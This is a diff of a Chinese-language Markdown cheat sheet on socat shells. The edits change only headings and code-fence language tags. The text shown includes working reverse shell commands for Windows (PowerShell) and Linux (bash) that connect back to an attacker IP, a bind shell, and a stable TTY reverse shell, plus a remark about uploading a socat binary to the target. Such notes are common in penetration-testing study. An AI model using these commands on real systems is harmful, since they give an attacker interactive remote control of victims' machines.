@@ -17,15 +17,14 @@
 
 ---
 
-## 2. 基礎反彈 Shell (Reverse Shell)
+## 2. 基礎Reverse Shell 
 
 這種方式產生的 Shell 是**不穩定**的，效果等同於 `nc -lvnp`。
 
 ### **攻擊機（監聽端）**
 
-Bash
 
-```
+```bash
 socat TCP-L:<port> -
 ```
 
@@ -38,9 +37,8 @@ socat TCP-L:<port> -
 
 - **Windows:**
     
-    PowerShell
     
-    ```
+    ```powershell
     socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
     ```
     
@@ -48,16 +46,15 @@ socat TCP-L:<port> -
         
 - **Linux:**
     
-    Bash
     
-    ```
+    ```bash
     socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
     ```
     
 
 ---
 
-## 3. 基礎綁定 Shell (Bind Shell)
+## 3. 基礎Bind Shell 
 
 ### **目標機（監聽端）**
 
@@ -68,23 +65,21 @@ socat TCP-L:<port> -
 
 ### **攻擊機（連入端）**
 
-Bash
 
-```
+```bash
 socat TCP:<TARGET-IP>:<TARGET-PORT> -
 ```
 
 ---
 
-## 4. 進階：穩定的 Linux TTY 反彈 Shell
+## 4. 進階：穩定的 Linux TTY Reverse Shell
 
 這是 Socat 最強大的用法，能直接獲得一個支持 `Ctrl+C`、自動補全、且不會崩潰的 TTY。
 
 ### **步驟 1：攻擊機啟動特殊監聽器**
 
-Bash
 
-```
+```bash
 socat TCP-L:<port> FILE:`tty`,raw,echo=0
 ```
 
@@ -97,9 +92,8 @@ socat TCP-L:<port> FILE:`tty`,raw,echo=0
 
 此指令要求目標機必須有 `socat` 二進制文件（可手動上傳編譯好的版本）。
 
-Bash
 
-```
+```bash
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
